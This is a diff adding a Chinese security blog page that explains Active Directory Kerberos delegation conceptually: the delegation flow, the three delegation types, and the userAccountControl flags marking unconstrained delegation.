@@ -1,0 +1,1405 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>委派攻击 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              委派攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="_1">委派攻击<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>域委派是大型网络中经常部署的应用模式，给多跳认证带来了很大的便利，但是与此同时也带来了很大的安全隐患。利用委派，攻击者可获取本地管理员甚至域管理员权限，还可以制作深度隐藏的后门。</p>
+<h2 id="_2">域委派<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>域委派是指将域内用户的权限委派给其他服务账号，使得服务账号能以用户权限访问域内的其他服务。</p>
+<p>如图所示委派流程，域用户 xie\test 以Kerberos 身份验证访问Web服务器，请求下载文件。但是真正的文件在后台的文件服务器上。于是Web服务器的服务账号 websrv 模拟域用户 xie/test，以 Kerberos 协议继续认证到后台文件服务器。后台文件服务器将文件返回给Web服务器，Web服务器再将文件返回给域用户 xie/test 。这样，就完成了一个委派的流程。</p>
+<blockquote>
+<p>1.域用户访问Web服务器： 假设你是用户 xie\test，你现在需要从一个Web服务器上下载文件。但这些文件并不直接存储在Web服务器上，而是在后台的文件服务器上。首先，你通过Kerberos协议认证并访问了Web服务器，表明你是合法用户。</p>
+<p>2.Web服务器代表你去访问文件服务器： Web服务器本身没有直接访问文件的权限，但你作为合法用户是有权限访问文件服务器的。这时，Web服务器（使用它的服务账号 websrv）会模拟你，使用Kerberos委派技术代表你去后台的文件服务器请求文件。</p>
+<p>3.Kerberos委派的本质： Kerberos协议允许Web服务器以你的身份（即 xie\test）继续认证并请求文件服务器访问资源。文件服务器接受这个请求，认为是你本人在访问，尽管实际上请求是通过Web服务器传递的。</p>
+<p>4.文件服务器响应并返回文件： 文件服务器验证了Web服务器是以你 xie\test 的身份进行访问，并且这个身份有权限访问该文件。于是，文件服务器将请求的文件返回给Web服务器。</p>
+<p>5.Web服务器再返回文件给你： Web服务器得到了文件后，再将文件返回给你（xie\test），完成整个请求流程。</p>
+<p>委派的核心：</p>
+<p>1.Web服务器并不是以自己的身份去请求文件，而是借用了你的身份。</p>
+<p>2.文件服务器相信Web服务器，因为它通过Kerberos委派技术验证了Web服务器确实是在代表你行事。</p>
+</blockquote>
+<p><img alt="截图" src="5835b210d41fb543c5449282ab2826af.png" /></p>
+<p>在域中，只有 <strong>主机账号</strong> 和 <strong>服务账号</strong> 才具有委派属性</p>
+<ul>
+<li>主机账号就是活动目录中<code>Computers</code> 中的计算机，也可以称为<strong>机器账号</strong>。</li>
+<li>服务账号是<strong>域内用户账号</strong>的一种类型，是将服务运行起来并加入域时所用的账号。例如<code>SQL Server</code>在安装时，会在域内自动注册服务账号<code>SQLServiceAccount</code>，也可以将域用户通过注册 SPN 变为服务账号。</li>
+</ul>
+<h2 id="_3">委派的分类<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>域内委派主要有 3 种应用方式：<code>非约束性委派（UD：Unconstrained Delegation）</code>、<code>约束性委派（CD：Constrained Delegation）</code>和 <code>基于资源的约束性委派(RBCD：Resource Based Constrained Delegation)</code>。现在让我们来具体看看这三种委派之间的联系和差异。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>非约束性委派  UD</th>
+<th>约束性委派  CD</th>
+<th>基于资源的约束性委派  RBCD</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>安全性</td>
+<td>低</td>
+<td>较高</td>
+<td>最高</td>
+</tr>
+<tr>
+<td>工作方式</td>
+<td>服务可以自由代表用户访问所有资源</td>
+<td>约由管理员指定可以访问的资源</td>
+<td>资源所有者自己控制访问权限</td>
+</tr>
+<tr>
+<td>简单理解</td>
+<td>Web服务器获得了用户的万能钥匙(TGT),可以用这把钥匙打开任意门(资源)</td>
+<td>Web服务器获得了用户的特定钥匙,这把钥匙只能打开特定的门(文件服务器)</td>
+<td>资源本身控制了谁可以代表用户来访问它,只有特定的服务(例如Web服务器)才能获得钥匙进入这个资源。</td>
+</tr>
+<tr>
+<td>风险</td>
+<td>服务被攻击时，攻击者可以横向移动</td>
+<td>必须由管理员手动配置</td>
+<td>配置复杂，需要良好的管理</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1">1.非约束性委派<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p>在 Windows Server2000 首次发布 Active Directory 时，Microsoft 就提供了一种简单的机制来支持用户通过 Kerberos 向 Web 服务器进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案，这就是最早的<code>非约束性委派（UD：Unconstrained Delegation）</code>。对于非约束性委派，服务账号可以获取被委派用户的 TGT 认购权证，并将 TGT 认购权证缓存到 <code>LSASS</code> 进程中，从而服务账号可使用该 TGT 认购权证，模拟该用户访问任意服务。非约束委派的设置需要<code>SeEnableDelegationPrivilege</code> 特权，该特权默认仅授予域管理员和企业管理员。</p>
+<blockquote>
+<p>当用户使用Kerberos协议登录并访问某个服务（比如Web服务器），Kerberos会为该用户颁发一个TGT。在非约束性委派中，服务账号（例如Web服务器的websrv账号）可以获取该用户的TGT。这意味着，服务账号可以拿到用户的"身份凭据"，即TGT。</p>
+<p>在非约束性委派模式下，当用户通过Kerberos协议登录并访问某个服务时，该服务的账号可以获取到用户的TGT（身份凭据）。该TGT会被缓存到LSASS进程中，以便后续使用。拥有这个TGT的服务账号可以模拟该用户，代表用户访问其他Kerberos认证的服务，而无需再次询问用户的凭据或密码。</p>
+</blockquote>
+<ul>
+<li>配置了非约束性委派属性的<strong>机器账号</strong>的<code>userAccountControl</code> 属性有个Flag 位：<code>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数是 <code>0x81000=528384</code>，如图所示。</li>
+<li>配置了非约束性委派属性的<strong>服务账号</strong>的<code>userAccountControl</code>属性有个Flag 位：<code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数是 <code>0x80200=524800</code>，如图所示。</li>
+</ul>
+<p><img alt="截图" src="3258808168009700306fdaa5a86e3816.png" /></p>
+<p><img alt="截图" src="74c1e1f161784a5bd76a44bd8b07dfab.png" /></p>
+<p>注：<strong>域控制器默认配置了非约束性委派</strong>。</p>
+<h4 id="_4">非约束性委派流程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>下图所示是微软官方对于非约束性委派流程的介绍：</p>
+<p><img alt="截图" src="b20bebd8a89608aa015c9846f43de5f0.png" /></p>
+<p>在该流程中，TGT1 认购权证请求的 ST 服务票据用于访问 service1 服务，TGT2认购权证请求的 ST 服务票据用于访问 service2 服务。</p>
